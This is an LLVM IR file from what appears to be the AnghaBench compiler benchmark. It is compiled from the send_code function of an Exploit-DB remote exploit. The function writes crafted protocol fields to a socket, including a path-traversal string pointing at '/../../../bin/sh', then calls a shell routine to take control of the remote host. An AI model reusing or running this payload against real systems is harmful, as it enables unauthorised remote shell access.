; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_1114.c_send_code.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_1114.c_send_code.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@sockfd = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [5 x i8] c"\00\00\00.\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"2\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.3 = private unnamed_addr constant [3 x i8] c" a\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c" 0\00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c" A\00", align 1
@.str.6 = private unnamed_addr constant [4 x i8] c" 28\00", align 1
@.str.7 = private unnamed_addr constant [17 x i8] c"/../../../bin/sh\00", align 1
@.str.8 = private unnamed_addr constant [7 x i8] c"digit \00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"AAAA\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @send_code() #0 {
  %1 = alloca [32 x i8], align 16
  %2 = load i32, i32* @sockfd, align 4
  %3 = call i32 @write(i32 %2, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 4)
  %4 = load i32, i32* @sockfd, align 4
  %5 = call i32 @write(i32 %4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0), i32 1)
  %6 = load i32, i32* @sockfd, align 4
  %7 = call i32 @write(i32 %6, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0), i32 1)
  %8 = load i32, i32* @sockfd, align 4
  %9 = call i32 @write(i32 %8, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i32 2)
  %10 = load i32, i32* @sockfd, align 4
  %11 = call i32 @write(i32 %10, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0), i32 1)
  %12 = load i32, i32* @sockfd, align 4
  %13 = call i32 @write(i32 %12, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i32 2)
  %14 = load i32, i32* @sockfd, align 4
  %15 = call i32 @write(i32 %14, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0), i32 1)
  %16 = load i32, i32* @sockfd, align 4
  %17 = call i32 @write(i32 %16, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i32 2)
  %18 = load i32, i32* @sockfd, align 4
  %19 = call i32 @write(i32 %18, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0), i32 1)
  %20 = load i32, i32* @sockfd, align 4
  %21 = call i32 @write(i32 %20, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i32 2)
  %22 = load i32, i32* @sockfd, align 4
  %23 = call i32 @write(i32 %22, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0), i32 1)
  %24 = load i32, i32* @sockfd, align 4
  %25 = call i32 @write(i32 %24, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %26 = load i32, i32* @sockfd, align 4
  %27 = call i32 @write(i32 %26, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0), i32 1)
  %28 = load i32, i32* @sockfd, align 4
  %29 = call i32 @write(i32 %28, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.6, i64 0, i64 0), i32 3)
  %30 = load i32, i32* @sockfd, align 4
  %31 = call i32 @write(i32 %30, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0), i32 1)
  %32 = getelementptr inbounds [32 x i8], [32 x i8]* %1, i64 0, i64 0
  %33 = call i32 @snprintf(i8* %32, i32 32, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.7, i64 0, i64 0))
  %34 = load i32, i32* @sockfd, align 4
  %35 = getelementptr inbounds [32 x i8], [32 x i8]* %1, i64 0, i64 0
  %36 = getelementptr inbounds [32 x i8], [32 x i8]* %1, i64 0, i64 0
  %37 = call i32 @strlen(i8* %36)
  %38 = call i32 @write(i32 %34, i8* %35, i32 %37)
  %39 = load i32, i32* @sockfd, align 4
  %40 = call i32 @write(i32 %39, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0), i32 1)
  %41 = load i32, i32* @sockfd, align 4
  %42 = call i32 @write(i32 %41, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0), i32 1)
  %43 = load i32, i32* @sockfd, align 4
  %44 = call i32 @write(i32 %43, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.8, i64 0, i64 0), i32 6)
  %45 = load i32, i32* @sockfd, align 4
  %46 = call i32 @write(i32 %45, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i64 0, i64 0), i32 6)
  %47 = call i32 (...) @shell()
  %48 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @snprintf(i8*, i32, i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @shell(...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
